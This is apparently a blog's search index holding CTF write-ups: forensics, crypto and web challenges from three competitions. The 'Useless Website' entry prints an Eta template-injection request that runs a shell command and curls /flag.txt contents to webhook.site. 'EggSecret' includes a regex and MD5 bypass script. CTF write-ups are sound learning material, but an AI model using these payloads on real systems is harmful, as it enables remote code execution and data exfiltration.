<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Readme</title>
    <url>/2024/12/31/Readme/</url>
    <content><![CDATA[<p>This is my First Post in my Website!!<br>There will be Writeup for my CTF Challenge and maybe some Learning stuff I Guess???</p>
]]></content>
  </entry>
  <entry>
    <title>CSLU 2024 UPM</title>
    <url>/2024/12/31/CSLU-2024-UPM/</url>
    <content><![CDATA[<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Dr-Mals"><a href="#Dr-Mals" class="headerlink" title="Dr. Mals"></a>Dr. Mals</h2><hr>
<ol>
<li>Download the Dr. Mals word file</li>
<li>Use Oletools - olevba to decrypt this file<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/f6c2bc3c-cc2f-40dc-a40b-8eaef09150cd"
                      alt="image"
                ></li>
</ul>
</li>
<li>With the use of CyberChef, we can find out the encoded text<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/927f7112-1acd-487a-8c57-a5a9fa5fa144"
                      alt="image"
                ></li>
</ul>
</li>
<li>Searching the website and it given<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/3f0cf691-eea1-45ce-9dd9-30e9442d1a79"
                      alt="image"
                ></li>
</ul>
</li>
<li>Lets decode this<ul>
<li>With the use of online decoderwe can find out the flag</li>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/62c1dd32-c3a9-4a8d-9f3b-3b331119dba8"
                      alt="image"
                ></li>
</ul>
</li>
<li>Thats it.</li>
</ol>
<h4 id="Acknowledgement"><a href="#Acknowledgement" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx to Akram for providing Hint</p>
<h2 id="RE-Memory-Delete"><a href="#RE-Memory-Delete" class="headerlink" title="RE:Memory Delete"></a>RE:Memory Delete</h2><hr>
<ol>
<li>First, we download the attached file given by the challenge.<ul>
<li>Challenge.7z</li>
</ul>
</li>
<li>Unzip it.<br>-Challenge.ad1 files inside.</li>
<li>.ad1 is a image files so lets use FTK Imager to find the deleted file</li>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/98a6ce23-53b1-4a37-9a8c-9a9cae49e6f1"
                      alt="image"
                ></li>
<li>There goes the flag</li>
</ol>
<h2 id="Skyfall"><a href="#Skyfall" class="headerlink" title="Skyfall"></a>Skyfall</h2><hr>
<p><em>Pain killer, My Skill issue… XD</em></p>
<ol>
<li>Download the file attach by the challenge.<br>-capture.pcapng</li>
<li>Use wireshark to open the pcapng files</li>
<li>See the clue given, Love the EDITED LEWIS VERSION files and lost the flag.<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/9ec25fe0-ecd3-4587-a4e7-5887377fbfbe"
                      alt="image"
                ></li>
</ul>
</li>
<li>File -&gt; Export -&gt; Http, and save all the files.</li>
<li>we can see there is 5 files exported, 2 text file with word <code>File received successfully!</code> and <code>file_data=16ae9187d13259788a97aef16a7d50f8b6376fbcba92a0f53e7e68d9f562a3a6576a3183a8dc8631c64fbd9147c8b608</code><ul>
<li>usefull for later</li>
</ul>
</li>
<li>And there is a file with big data 24,345kb and let us see what file is that.</li>
</ol>
<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/395b8f53-8888-4af0-bf28-ae6f5b156992"
                      alt="image"
                ></li>
</ul>
<ol start="7">
<li>Looks like it is a elf file<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/a9223eb5-5494-4476-b76e-94ca61886bab"
                      alt="image"
                ></li>
<li>I manage to find a website to extract the elf file <a class="link"   href="https://www.ezyzip.com/open-extract-elf-file.html#" >EzyZIP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li>We can see the largest file is here after extract</li>
</ol>
<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/d61f4dc0-bd2e-4e85-922c-cbaaa903fb5e"
                      alt="image"
                ><br>After have a long time searching, i cant found any ways to extract pydata… skill issue XD</li>
</ul>
<ol start="10">
<li>After the end of the day, my friend told me there is something call <code>Pyinstxtractor</code> that can extract it.<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/647ba1e4-5257-4eae-8e27-94885a3b018b"
                      alt="image"
                ></li>
<li>This is what i found</li>
</ul>
</li>
<li>okayyyy here is it<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/839516f6-2d26-4c28-af8e-cfbd172314e6"
                      alt="image"
                ></li>
</ul>
</li>
<li>Theres alot files inside, but the one the name <code>skyfall-lewis-edited-version.pyc</code> is the most suspicious.<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/b3e6721f-12fd-4eba-a1fc-7d8d92ac3bc0"
                      alt="image"
                ></li>
</ul>
</li>
<li>With the use of this website <a class="link"   href="https://pylingual.io/" >Pylingual<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, i transfer pyc files to py<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/575f7882-fe26-4d1c-91f5-69de17c6099c"
                      alt="image"
                ></li>
</ul>
</li>
<li>We can see it is a AES encyption function and the key is the time which the user encrypt when downloaded, so lets go back to wireshark and find the date when she successfuly download.<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/f286e913-9441-4f6b-8273-1b7df152b17d"
                      alt="image"
                ></li>
<li>We can find out that the epoch for the time she download the file is <code>1733988750</code></li>
</ul>
</li>
<li>Then use GPT xd find the key out<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/c5d87093-080a-410e-b361-ce07d7c64747"
                      alt="image"
                ></li>
<li>ps: I also dk why need to use <code>1733988749</code> just told by my friend to use it cant find any things that support this epoch XD.</li>
</ul>
</li>
<li>Okay, then let us go to decrypt it. Use cyberchef</li>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/0a6837ae-ddf5-41d3-a810-7318c56a4607"
                      alt="image"
                ><br>Heres the flag.<br>Okay its maybe abit harder than i though. cry die.</li>
</ol>
<h4 id="Acknowledgement-1"><a href="#Acknowledgement-1" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx to Bakayang for providing solution at the end of the day</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Useless-Website"><a href="#Useless-Website" class="headerlink" title="Useless Website"></a>Useless Website</h2><hr>
<ol>
<li><p>Download the source code of the website</p>
</li>
<li><p>We can see theres something in the package.json file</p>
<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/ded38f60-d45c-406f-87ca-353241b395e5"
                      alt="image"
                ></li>
</ul>
</li>
<li><p>Searching on the internet <code>CVE-2022-25967</code> showing that there is some leakage can be use on the eta framework.</p>
</li>
<li><p>In burpsuite, intercept the web and change to this</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>/utils/settings HTTP/1.1</span></figcaption><table><tr><td class="code"><pre><span class="line">Host: 5.75.155.50:1341</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-None-Match: W/&quot;1057-ih1IUXlwncna8aHynJLYIHjiX30&quot;</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Length: 292</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;view options&quot;: &#123;</span><br><span class="line">      &quot;varName&quot;: &quot;x=process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;curl https://webhook.site/self id/$(cat /flag.txt)&#x27;)&quot;,</span><br><span class="line">      &quot;include&quot;: false,</span><br><span class="line">      &quot;includeFile&quot;: false,</span><br><span class="line">      &quot;useWith&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>And we can find out the flag at the end of the webhook link.</p>
<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/ee3ce174-09de-43c1-82ea-43f979aa075d"
                      alt="image"
                ></li>
<li><code>CSLU&#123;wh4ts_y0ur_et4?&#125;</code></li>
</ul>
</li>
</ol>
<h4 id="Acknowledgement-2"><a href="#Acknowledgement-2" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx for Megat for the solution.</p>
]]></content>
      <categories>
        <category>CTF 2024</category>
      </categories>
      <tags>
        <tag>Forensics</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>CyberX Internal CTF 2024</title>
    <url>/2024/12/31/CyberX-Internal-CTF-2024/</url>
    <content><![CDATA[<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Forensic-Odyssey-1-A-Message-in-the-Mist"><a href="#Forensic-Odyssey-1-A-Message-in-the-Mist" class="headerlink" title="Forensic Odyssey 1: A Message in the Mist"></a>Forensic Odyssey 1: A Message in the Mist</h2><hr>
<ol>
<li>First, we downlaod and unzip the Artifact.zip file with the password given by the challenge.</li>
<li>Inspect what inside the file.<ul>
<li>There is only a file name <code>CyberX_CTF.E01</code> file.</li>
</ul>
</li>
<li>Look closer, it is a <code>E01</code> extension file, as we know, <code>E01</code>file is a file extension for Encase Disk Image or (Encase Evidence Files or Expert Witness Format (EWF) files) Google ^_^!</li>
<li>To open this file, we need to download Auotspy(<a class="link"   href="https://www.autopsy.com/" >https://www.autopsy.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>) or Eterro FTK Imager(<a class="link"   href="https://www.exterro.com/digital-forensics-software/ftk-imager" >https://www.exterro.com/digital-forensics-software/ftk-imager<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)</li>
<li>After that, open Autospy(for this time I use Autospy), but before others flag, we need to find the first flag, i have mount the image to local disk E and I can see there is a Welcome.txt file in the disk.</li>
<li><ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/593e4d72-ceeb-4e7d-a35a-60bfbf0c7c5f"
                      alt="image"
                ></li>
<li><img  width="501" alt="image" 
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/c16df287-4631-46d4-acc6-b511698abf16"
                      
                ></li>
</ul>
</li>
<li>And you will get the flag in the txt file.<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/44e82b55-2148-4f53-beec-277bd3f09b4a"
                      alt="image"
                ></li>
</ul>
</li>
</ol>
<hr>
<h2 id="Forensic-Odyssey-2-The-Hidden-Path"><a href="#Forensic-Odyssey-2-The-Hidden-Path" class="headerlink" title="Forensic Odyssey 2: The Hidden Path"></a>Forensic Odyssey 2: The Hidden Path</h2><hr>
<ol>
<li>CONTINUE to the Forensics Odyssey 1.</li>
<li>Open the autospy and open the disk image.</li>
<li>Before started, we should think where is the data normally will be hidden.<ul>
<li>Recycle bin etc…</li>
</ul>
</li>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/42ba190b-9590-4234-87bb-a46a9169f540"
                      alt="image"
                ></li>
<li>We can see there is the flag, but opps, it is not the correct flag after I tried. Lets have a check for others flag.</li>
<li>After few searching we can see there is a hidden named file in <code>user/plssk/download/</code></li>
<li>there is a txt file name flag2.txt and when we press in, there is a sentences<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/bb14d2d9-8d88-491d-af9e-03e6dd97be92"
                      alt="image"
                ></li>
</ul>
</li>
<li>Where is the flag??</li>
<li>When we highlights it, we can see there is different size of space in there<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/8c33799f-371b-4df6-852d-84ae10893c6c"
                      alt="image"
                ></li>
</ul>
</li>
<li>Copy it and go to white space decoder()</li>
</ol>
<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/aba034e4-2b70-48a8-aa46-8eecb127cc4c"
                      alt="image"
                ></li>
</ul>
<ol start="11">
<li>There you go ! The flag for this challenge is out!</li>
</ol>
<hr>
<h2 id="Forensic-Odyssey-3-The-Time-Traveler"><a href="#Forensic-Odyssey-3-The-Time-Traveler" class="headerlink" title="Forensic Odyssey 3: The Time Traveler"></a>Forensic Odyssey 3: The Time Traveler</h2><hr>
<ol>
<li>Continue Forensics Odyssey 2.</li>
<li>We can see there is something hidding in here</li>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/7c81eb0a-e7f7-4f97-9990-30615311bc40"
                      alt="image"
                ></li>
<li>After we take the encrypted code from txt and put into CyberChef to decode the base64 text.</li>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/e8deb263-9a5e-4739-ba34-941feb8c486d"
                      alt="image"
                ></li>
<li>Here this is the flag!</li>
</ol>
<hr>
<h2 id="Forensic-Odyssey-4-The-Final-Trail"><a href="#Forensic-Odyssey-4-The-Final-Trail" class="headerlink" title="Forensic Odyssey 4: The Final Trail"></a>Forensic Odyssey 4: The Final Trail</h2><hr>
<ol>
<li>Continue Forensics Odyssey 3.</li>
<li>Last we can see there is a deleted files in the side of the tab</li>
</ol>
<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/198a4dab-284a-464a-a87e-c0f8615ca65e"
                      alt="image"
                ></li>
</ul>
<ol start="3">
<li>Press <code>All</code></li>
<li>And we can see the last flag at here, it is easy right!</li>
</ol>
<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/598a80c8-3357-42d3-88d0-4c36b7499783"
                      alt="image"
                ></li>
</ul>
<hr>
<h2 id="Knock-Knock"><a href="#Knock-Knock" class="headerlink" title="Knock Knock"></a>Knock Knock</h2><hr>
<ol>
<li>Download the attachment given by the challenge.</li>
<li>Open the pcap file using wireshark(<a class="link"   href="https://www.wireshark.org/#downloadLink" >https://www.wireshark.org/#downloadLink<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)</li>
<li>We can see theres only TCP Protocol this time, but hey look at the down-right corner, its at there again.<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/eaaf7623-2810-4ac7-b310-f75a4b97aa85"
                      alt="image"
                ></li>
</ul>
</li>
<li>OK lets try different port. And we can see there is a different character but the same as flag CyberX{ word.</li>
<li>So just follow and record it one by one and we can get the flag for this challenge.<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/2613a9d0-598a-4aa8-9d8c-fde38289d386"
                      alt="image"
                ></li>
</ul>
</li>
<li>Hooray there goess the flag!</li>
</ol>
<h4 id="Knock-Knock-whose-there-CyberX-here-hehe"><a href="#Knock-Knock-whose-there-CyberX-here-hehe" class="headerlink" title="Knock Knock, whose there? CyberX here hehe."></a>Knock Knock, whose there? CyberX here hehe.</h4><hr>
<h2 id="Poslaju"><a href="#Poslaju" class="headerlink" title="Poslaju"></a>Poslaju</h2><hr>
<ol>
<li>Download the attachment given by the challenge.</li>
<li>Open the pcap file using wireshark(<a class="link"   href="https://www.wireshark.org/#downloadLink" >https://www.wireshark.org/#downloadLink<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)</li>
<li>Choose one port of http and right click, follow the http stream.</li>
<li>You can see there is a C in front of the HTTP&#x2F;1.1.<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/561fba6a-e20b-446f-b1ac-90ef149fec8c"
                      alt="image"
                ></li>
</ul>
</li>
<li>Looks like there is a flag there maybe, so lets try increase the stream.<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/de8fd55d-4ff7-425a-ae4e-e0b8fee270ed"
                      alt="image"
                ></li>
</ul>
</li>
<li>Looks like there is a y, so lets record it (flag type &#x3D; CyberX{})<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/98c918b7-5db8-401a-af80-ccecd7c52f51"
                      alt="image"
                ></li>
<li>Record the flag one bye one by increasing the stream.</li>
</ul>
</li>
<li>And there is it the flag!</li>
</ol>
<hr>
<h2 id="Powershell-1"><a href="#Powershell-1" class="headerlink" title="Powershell 1"></a>Powershell 1</h2><hr>
<ol>
<li>Download the Runme.zip file from the attachment.</li>
<li>Unzip the file</li>
<li>Inspect what inside the file.<ul>
<li>It contains only  <code>runme.ps1</code></li>
</ul>
</li>
<li>I try edit the file with notepad and inside we can see this code<br><code>powershell -EncodedCommand ZQBjAGgAbwAgAEMAeQBiAGUAcgBYAHsAdwBoADQAdABfADEAbgBfAHQAaAA0AF8AYgBhAHMAZQA2ADQAXwAxAHMAXwBUAGgAMQBzACEAIQB9AA==</code></li>
<li>ZQBjAGgAbwAgAEMAeQBiAGUAcg…. is smoehow look like a encryted words.</li>
<li>Use CyberChef(<a class="link"   href="https://cyberchef.net/" >https://cyberchef.net/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)</li>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/4110855f-aa84-4db3-bd11-979ced3d4587"
                      alt="image"
                ></li>
<li>And there is it the Flag!</li>
</ol>
<hr>
<h2 id="Santa-Scan"><a href="#Santa-Scan" class="headerlink" title="Santa Scan"></a>Santa Scan</h2><hr>
<ol>
<li>First download the attachment given by the challenge.</li>
<li>It is a file call santa_scan.pcap.</li>
<li>Open the file using wireshark(<a class="link"   href="https://www.wireshark.org/#downloadLink" >https://www.wireshark.org/#downloadLink<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)</li>
<li>The hint given by the challenge is TCP, so let us type TCP in the seach box.</li>
<li>As you can see there is a lot of port with TCP Protocol.</li>
<li>Now lets find where is the flag, but hey see, there is something at the down-right corner (highlighted)<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/1b897044-3b61-41b2-aa43-81fae3a7dd67"
                      alt="image"
                ></li>
</ul>
</li>
<li>After pressing few TCP Ports and we can sure that it is the Flag for us (TCP Stream with port length 60)<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/c3c72452-1e08-4f89-8639-392042818d83"
                      alt="image"
                ></li>
</ul>
</li>
<li>Thats the flag!! Hooray, Happy Christmas HoHoHo!!!</li>
</ol>
<hr>
<h2 id="ZipCrack-1-The-Hidden-Lock"><a href="#ZipCrack-1-The-Hidden-Lock" class="headerlink" title="ZipCrack 1: The Hidden Lock"></a>ZipCrack 1: The Hidden Lock</h2><hr>
<ol>
<li><p>Download the zip file from the attachment.</p>
</li>
<li><p>unzip the file, but hemm, look like normally unzip is not suitable(see the attach picture)</p>
<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/42a109a3-89bd-483f-ad01-1ca00d3d6c75"
                      alt="image"
                ></li>
</ul>
</li>
<li><p>So use command <code>7z e flag.zip</code> 7zip is a better unzip tools in this case. But ohno there is a password.</p>
<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/72ed79ac-ef55-4727-ae7f-3828b5d96907"
                      alt="image"
                ></li>
</ul>
</li>
<li><p>So i try to bruteforce it using  <code>John The Ripper</code> .</p>
<ul>
<li>because it is a zipfile, we need to use command <code>zip2john flag.zip &gt; hash.txt</code> to make the zip file a hash text then we can use to bruteforce finding the same hash to find out the password.</li>
</ul>
</li>
<li><p>Use this command <code>john -w usr/share/wordlists/rockyou.txt hash.txt</code></p>
</li>
<li><p>And we will found out that the password for this file is <code>rainbow1</code></p>
<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/86d78732-768b-4f18-b9ad-26d4d356e3a6"
                      alt="image"
                ></li>
</ul>
</li>
<li><p>And now let use use the password to go inside and take a look of the flag.txt file</p>
<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/e50f85c5-f31d-486a-a1e5-cd5bce1e2238"
                      alt="image"
                ></li>
</ul>
</li>
<li><p>Thats it!! the flag for this question!!</p>
</li>
</ol>
<h2 id="ZipCrack-2-The-Champion-Lock"><a href="#ZipCrack-2-The-Champion-Lock" class="headerlink" title="ZipCrack 2: The Champion Lock"></a>ZipCrack 2: The Champion Lock</h2><hr>
<ul>
<li>this make me frustrated and at the end just found out a word in upper case causing fail …..</li>
</ul>
<ol>
<li><p>First download the attachment for the challenge.</p>
</li>
<li><p>Same as the last question it need to use 7z to unzip. But this time, hint is using the LOL Champions name.</p>
</li>
<li><p>Im not a LOL player so, i go online search what is champion and blablabla~, and found out champions is a character of the LOL Games.</p>
</li>
<li><p>Ok now have the hint, i try go GPT to let it list it our for me all champions name 100+ and make it a wordlist (.txt)</p>
</li>
<li><p>Last, use john to bruteforce the zipfile answer using the command</p>
<p><code>zip2john champion.zip &gt; hash_flag2.txt</code><br><code>john --wordlist=lol_wordlist.txt hash_flag2.txt</code></p>
</li>
<li><p>And we found out the password for this file is</p>
<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/02af9e4f-3dc4-455b-83b1-e3937200acbd"
                      alt="image"
                ></li>
<li>Credit to my teammates Ching Yang to find out, as my wordlist is with uppercase in the first character…….</li>
</ul>
</li>
<li><p>use 7z to unzip it and we can see the flag is inside Yay!</p>
<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/user-attachments/assets/747118fd-d46b-4736-95b8-055d58d15c86"
                      alt="image"
                ></li>
</ul>
</li>
<li><p>There you go the flag!!</p>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF 2024</category>
      </categories>
      <tags>
        <tag>Forensics</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>EQFCTF 2025</title>
    <url>/2025/01/18/EQFCTF-2025/</url>
    <content><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Join-Our-Discord"><a href="#Join-Our-Discord" class="headerlink" title="Join Our Discord"></a>Join Our Discord</h2><ul>
<li>Just join the discord and there is the flag on the annoucment channel <code>RVFDVEZ7VzNsQzBtM19UMF9FcXVpbGlicml1bV9EMXNjMHJkfQ==</code><br>cyberchef it and get the flag <code>EQCTF&#123;W3lC0m3_T0_Equilibrium_D1sc0rd&#125;</code></li>
</ul>
<h1 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h1><h2 id="Velociraptor"><a href="#Velociraptor" class="headerlink" title="Velociraptor"></a>Velociraptor</h2><ol>
<li>Download the attach file</li>
<li>VeLoCiraptor\C\Users\kelvin\AppData\Roaming\Microsoft\Windows\Recent<ul>
<li>We can found some hash on this page with the file name <code>RVFDVEZ7MXRzX3IzNExseV9o and MG1ldzBya190UnVTdF9tMyF9</code></li>
</ul>
</li>
<li>Then just cyberchef it.</li>
</ol>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Neighbour-RSA"><a href="#Neighbour-RSA" class="headerlink" title="Neighbour RSA"></a>Neighbour RSA</h2><ol>
<li><p>Download the file, then see the rsa encrypted code</p>
<details>
  <summary>Click here to expand</summary>
  <p>```from Crypto.Util.number import inverse, long_to_bytes
 from gmpy2 import isqrt, mpz
 def fermat_factorization(N):
 a = isqrt(N) + 1
 b2 = a * a - N
 while not is_square(b2):
     a += 1
     b2 = a * a - N
 b = isqrt(b2)
 return a - b, a + b

<p> def is_square(n):<br> return isqrt(n) ** 2 &#x3D;&#x3D; n</p>
<h1 id="Given-values"><a href="#Given-values" class="headerlink" title="Given values"></a>Given values</h1><p> N &#x3D; 14587704432822344892341272427282646120364434437414523883376089608218979364959927948590898540264210246449374363014541914863792835772986609660515612532877044074684115597786182642011407163350289201826895454398548254854919237599957739718174053771619150887665707867636064460914489445835497948439951659044458159773886454887057327846897569977945202458245268351728125973721764332352011029125694046428350269451464778793326007087955043888570293765138721335344787054343738337660927131968049415376352589981259058448540690666004751490375493430556965591293772542601776934892741235532054785639594081598607404023545471998403197674267<br> e &#x3D; 65537<br> C &#x3D; 7329184746351979600304810893726842767688467204256990201181172159445966473650977905122553415838916142690364388789400790015517642902297387406215773278164829517035052625373870964570981590734714495297149889660019174034119566329569798047522829383224123884562703447321306836996392334132844673471179765556339187200820259655159008340673516040862000226792914228312336356120448967504158288031247387263438925257977725844911872753683719735641011693324441777888582417108481882731436005780409094974241968759397096299213838515746566064813787517925040756180508206242396925444425306180593790729890681708626826056328684043890127100581</p>
<h1 id="Step-1-Factorize-N"><a href="#Step-1-Factorize-N" class="headerlink" title="Step 1: Factorize N"></a>Step 1: Factorize N</h1><p> p, q &#x3D; fermat_factorization(N)<br> print(f”p &#x3D; {p}”)<br> print(f”q &#x3D; {q}”)</p>
<h1 id="Step-2-Compute-the-private-key-d"><a href="#Step-2-Compute-the-private-key-d" class="headerlink" title="Step 2: Compute the private key d"></a>Step 2: Compute the private key d</h1><p> phi &#x3D; (p - 1) * (q - 1)<br> d &#x3D; inverse(e, phi)<br> print(f”d &#x3D; {d}”)</p>
<h1 id="Step-3-Decrypt-the-ciphertext-C"><a href="#Step-3-Decrypt-the-ciphertext-C" class="headerlink" title="Step 3: Decrypt the ciphertext C"></a>Step 3: Decrypt the ciphertext C</h1><p> plaintext &#x3D; pow(C, d, N)<br> print(f”Plaintext (as long): {plaintext}”)</p>
<h1 id="Step-4-Convert-the-plaintext-to-bytes"><a href="#Step-4-Convert-the-plaintext-to-bytes" class="headerlink" title="Step 4: Convert the plaintext to bytes"></a>Step 4: Convert the plaintext to bytes</h1><p> flag &#x3D; long_to_bytes(plaintext)<br> print(f”Flag: {flag.decode()}”)</p></p>
</li>
</ol>
</details>```

<ol start="3">
<li>and here is it the flag</li>
</ol>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="EggSecret"><a href="#EggSecret" class="headerlink" title="EggSecret"></a>EggSecret</h2><ol>
<li>First download the file attached and lets see whats inside.</li>
<li>We can see that there is a secret hash at there <code>00e39786989574093743872279278460</code> also there is something we need to bypass <code>(preg_match(&quot;/^(.*?)+$/s&quot;, $egg))</code></li>
<li><pre><code class="import">
</code></pre>
</li>
</ol>
<pre><code>url = &quot;http://135.181.88.229:31730/&quot;

params = &#123;&quot;eggSecret&quot;: &quot;240610708&quot;&#125;  # String with MD5 hash starting with &quot;0e&quot;
data = &#123;&quot;egg&quot;: &quot;A&quot; * 10000&#125;  # Very large input to bypass the regex

response = requests.post(url, params=params, data=data)

print(response.text)```
</code></pre>
<ol start="4">
<li>and we can get the flag content.</li>
</ol>
]]></content>
      <categories>
        <category>CTF 2025</category>
      </categories>
      <tags>
        <tag>Forensics</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>TIS UTM</title>
    <url>/2025/01/20/post/</url>
    <content><![CDATA[<h1 id="Technology-Information-System-UTM"><a href="#Technology-Information-System-UTM" class="headerlink" title="Technology &amp; Information System UTM"></a>Technology &amp; Information System UTM</h1>]]></content>
  </entry>
</search>
